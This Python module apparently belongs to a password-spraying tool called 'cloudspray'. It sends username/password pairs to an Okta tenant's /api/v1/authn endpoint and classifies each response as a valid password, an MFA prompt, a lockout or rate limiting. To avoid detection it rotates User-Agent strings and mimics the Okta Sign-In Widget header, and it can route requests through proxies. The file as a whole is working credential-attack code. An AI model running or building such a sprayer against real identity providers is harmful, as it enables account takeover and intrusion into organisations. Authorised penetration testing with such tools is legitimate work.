"""Okta Primary Authentication API sprayer."""

import random
from datetime import datetime, timezone

import requests

from cloudspray.constants.error_codes import AuthResult
from cloudspray.constants.user_agents import USER_AGENTS
from cloudspray.state.models import SprayAttempt

# Maps Okta authn status strings to AuthResult values. Okta returns a JSON
# response with a "status" field on successful API calls (HTTP 200), where
# the status indicates the authentication state machine position.
_OKTA_STATUS_MAP: dict[str, AuthResult] = {
    "SUCCESS": AuthResult.SUCCESS,
    "MFA_REQUIRED": AuthResult.VALID_PASSWORD_MFA_REQUIRED,
    "MFA_ENROLL": AuthResult.VALID_PASSWORD_MFA_ENROLLMENT,
    "MFA_CHALLENGE": AuthResult.VALID_PASSWORD_MFA_REQUIRED,
    "LOCKED_OUT": AuthResult.ACCOUNT_LOCKED,
    "PASSWORD_EXPIRED": AuthResult.VALID_PASSWORD_EXPIRED,
}

# Maps Okta error codes (from 401/403 responses) to AuthResult values.
_OKTA_ERROR_MAP: dict[str, AuthResult] = {
    "E0000004": AuthResult.INVALID_PASSWORD,
    "E0000047": AuthResult.RATE_LIMITED,
}


class OktaAuthenticator:
    """Sprays credentials against Okta's /api/v1/authn endpoint.

    Sends username/password pairs to the Okta Primary Authentication API
    and classifies responses based on status codes and Okta-specific error
    codes. Rotates User-Agent headers and mimics the Okta Sign-In Widget
    to blend in with legitimate traffic.

    Args:
        okta_host: Okta tenant hostname (e.g., "corp.okta.com").
        proxy_session: Optional pre-configured requests.Session with proxy
            routing. If None, a plain session is created.
    """

    def __init__(self, okta_host: str, proxy_session: requests.Session | None = None):
        self._okta_host = okta_host
        self._authn_url = f"https://{okta_host}/api/v1/authn"
        self._session = proxy_session or requests.Session()

    def attempt(self, username: str, password: str) -> SprayAttempt:
        """Perform a single authentication attempt against Okta.

        Args:
            username: Full email or Okta username to authenticate.
            password: Password to test.

        Returns:
            A SprayAttempt with the classified result and request metadata.
        """
        user_agent = random.choice(USER_AGENTS)
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Okta-User-Agent-Extended": "okta-signin-widget-2.12.0",
            "User-Agent": user_agent,
        }
        payload = {"username": username, "password": password}

        proxy_url = ""
        result = AuthResult.UNKNOWN_ERROR
        error_code = ""

        try:
            resp = self._session.post(
                self._authn_url, json=payload, headers=headers, timeout=15
            )
            if hasattr(self._session, "last_proxy_url"):
                proxy_url = self._session.last_proxy_url

            try:
                data = resp.json()
            except ValueError:
                data = {}

            error_code = data.get("errorCode", "")
            result = self._classify_response(resp.status_code, data)
        except requests.RequestException:
            result = AuthResult.UNKNOWN_ERROR

        return SprayAttempt(
            username=username,
            password=password,
            client_id="okta-signin-widget",
            endpoint=self._authn_url,
            user_agent=user_agent,
            result=result,
            error_code=error_code,
            timestamp=datetime.now(timezone.utc),
            proxy_used=proxy_url,
        )

    def _classify_response(self, status_code: int, data: dict) -> AuthResult:
        """Map an Okta API response to an AuthResult enum value.

        Args:
            status_code: HTTP status code from the Okta response.
            data: Parsed JSON body from the response.

        Returns:
            The appropriate AuthResult classification.
        """
        if status_code == 200:
            return _OKTA_STATUS_MAP.get(data.get("status", ""), AuthResult.UNKNOWN_ERROR)

        if status_code in (401, 403):
            return _OKTA_ERROR_MAP.get(
                data.get("errorCode", ""), AuthResult.INVALID_PASSWORD
            )

        if status_code == 429:
            return AuthResult.RATE_LIMITED

        return AuthResult.UNKNOWN_ERROR
